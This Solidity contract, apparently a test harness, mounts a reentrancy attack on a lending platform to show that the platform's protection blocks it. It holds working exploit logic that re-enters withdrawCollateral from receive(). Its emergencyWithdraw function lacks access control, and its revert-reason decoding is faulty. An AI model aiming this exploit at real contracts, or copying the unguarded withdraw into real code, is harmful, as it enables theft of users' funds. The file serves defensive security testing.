// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title ReentrancyAttacker
 * @dev Malicious contract that attempts to perform reentrancy attack on lending platform
 * This demonstrates how reentrancy attacks work and proves our protection works
 */
contract ReentrancyAttacker {
    // Target lending platform to attack
    address public targetContract;
    
    // Track attack attempts
    uint256 public attackCount = 0;
    uint256 public maxAttempts = 3;
    
    // Events to track what happens
    event AttackStarted(address target, uint256 initialDeposit);
    event ReentrancyAttempted(uint256 attemptNumber);
    event AttackBlocked(string reason);
    event AttackFailed(string reason);
    event UnexpectedSuccess(uint256 amount);
    
    /**
     * @dev Constructor sets the target contract to attack
     * @param _targetContract Address of LendingPlatformWithCollateralSecure
     */
    constructor(address _targetContract) {
        targetContract = _targetContract;
    }
    
    /**
     * @dev Fallback function - this is where reentrancy happens
     * Called automatically when contract receives Ether
     */
    receive() external payable {
        emit ReentrancyAttempted(attackCount + 1);
        
        // Try to call withdrawCollateral again (reentrancy attempt)
        if (attackCount < maxAttempts) {
            attackCount++;
            
            try this.attemptWithdraw() {
                // If this succeeds, the contract is vulnerable!
                emit UnexpectedSuccess(msg.value);
            } catch Error(string memory reason) {
                // This should happen - attack blocked!
                emit AttackBlocked(reason);
            } catch {
                emit AttackFailed("Unknown error during reentrancy attempt");
            }
        }
    }
    
    /**
     * @dev Start the reentrancy attack
     * Step 1: Deposit collateral, Step 2: Try to withdraw (triggers reentrancy)
     */
    function startAttack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        
        attackCount = 0;
        emit AttackStarted(targetContract, msg.value);
        
        // Step 1: Deposit collateral to target contract
        (bool depositSuccess, ) = targetContract.call{value: msg.value}(
            abi.encodeWithSignature("depositCollateral()")
        );
        require(depositSuccess, "Failed to deposit collateral");
        
        // Step 2: Try to withdraw - this should trigger receive() and reentrancy
        this.attemptWithdraw();
    }
    
    /**
     * @dev Attempt to withdraw collateral (can be called recursively)
     */
    function attemptWithdraw() external {
        require(msg.sender == address(this), "Only this contract can call");
        
        // Try to withdraw 0.5 ETH - this should trigger receive() function
        (bool success, bytes memory data) = targetContract.call(
            abi.encodeWithSignature("withdrawCollateral(uint256)", 500000000000000000)
        );
        
        if (!success) {
            // Extract the revert reason
            string memory reason = "Unknown error";
            if (data.length > 0) {
                assembly {
                    reason := add(data, 0x20)
                }
            }
            revert(reason);
        }
    }
    
    /**
     * @dev Check our collateral balance in the target contract
     */
    function getMyCollateralBalance() public view returns (uint256) {
        (bool success, bytes memory data) = targetContract.staticcall(
            abi.encodeWithSignature("collateralBalance(address)", address(this))
        );
        
        if (success && data.length > 0) {
            return abi.decode(data, (uint256));
        }
        return 0;
    }
    
    /**
     * @dev Get this contract's ETH balance (to see if attack succeeded)
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @dev Reset attack counters for testing
     */
    function resetAttack() public {
        attackCount = 0;
    }
    
    /**
     * @dev Emergency function to withdraw any ETH from this contract
     */
    function emergencyWithdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}